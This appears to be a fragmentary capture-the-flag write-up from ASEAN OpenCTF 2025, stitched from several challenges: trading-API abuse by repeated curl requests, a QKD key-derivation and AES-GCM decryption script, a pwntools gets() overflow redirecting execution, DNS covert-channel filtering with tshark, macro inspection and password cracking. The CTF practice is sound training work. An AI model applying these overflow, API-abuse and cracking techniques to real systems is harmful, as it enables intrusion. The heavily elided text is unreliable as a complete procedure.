...
flag{sAN17Y\_CH3cK\_f0R\_4SEAN\_ct1\_2c7b03cb85bf}
...
```bash
for i in {1..10}; do
curl -s -X POST http://instance.asean-openctf2025.site:30292/api/trading/buy -H "Content-Type: application/json" -H "X-Session-ID: $S" -d '{"amount":5000,"orderType":"market"}' >/dev/null
done
curl -s -H "X-Session-ID: $S" http://instance.asean-openctf2025.site:30292/api/portfolio
```
...
```bash
curl -s -X POST http://instance.asean-openctf2025.site:30292/api/trading/buy -H "Content-Type: application/json" -H "X-Session-ID: $S" -d '{
"amount": 40000,
...
# 1) QKD sift: keep rows where bases match AND the bit agrees
bits = []
...
val = (val << 1) | bit
b.append(val)
key_material = bytes(b) # 38 bytes from the CSV
# 3) Derive AES-128 key from SHA-256(key_material)
key = hashlib.sha256(key_material).digest()[:16]
# 4) Split ciphertext into data + tag, then AES-GCM decrypt
...
def run(p):
    ...
    p.sendline(b'security123')          # don't send P@ssw0rd or it exits!
    p.recvuntil(b'>> ')
    p.sendline(build_payload(elf))      # gets() overflow → RIP → onepiece()
    p.interactive()                     # see the flag
...
tshark -r capture.pcapng -Y 'dns.flags.response==0 && dns.qry.name matches "^\[0-9]{4}\\\\.\[A-Za-z0-9\_\\\\-+/=]+\\\\.(covert-data\\\\.local)\\\\.?$"' -T fields -E header=n -e dns.qry.name

then beautify it and decode it. Found the header is mcGraphModel.

![](<../.gitbook/assets/1 (2).png>)

Research about it and we can open it in draw.io
...
## Letter of Motivation – FORENSICS
...
The challenge said the password is infected. Then the challenge file is docs. I so directly use olevba to see the macro.
...
reference https://medium.com/@malik.ubaidullah16/digital-cyber-security-hackathon-2023-forensics-container-writeup-f0c566155b8d
...
┌──(zeqzoq㉿zeqzoq)-[/mnt/c/Users/hzqzz/Downloads/bombardino]
...
============================================================================================================================================
* Device #2: cpu-haswell-AMD Ryzen 7 4800H with Radeon Graphics, 2915/5895 MB (1024 MB allocatable), 4MCU
...
Hardware.Mon.#2..: N/A
Started: Sat Aug 16 16:04:46 2025
Stopped: Sat Aug 16 16:06:48 2025
```

Mount the file using veracrypt with password “naruto”

Got odt file and a key.
...
Using libreoffice to open it. Make sure to assign the key.asc as the opengpg. Use “Jamie”
...
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@ssw0rd (.secret.zip/secret.txt)
1g 0:00:00:00 DONE (2025-08-16 16:41) 1.315g/s 10778p/s 10778c/s 10778C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The text file got Naruto. Damn. I wasted time.

Now the hint came. It say So use veracrypt again, but use the key.asc instead of Naruto.

Then it gave git folder and txt file. Check history and found flag2.zip
...
Open the pdf in the zip file. And got part 2
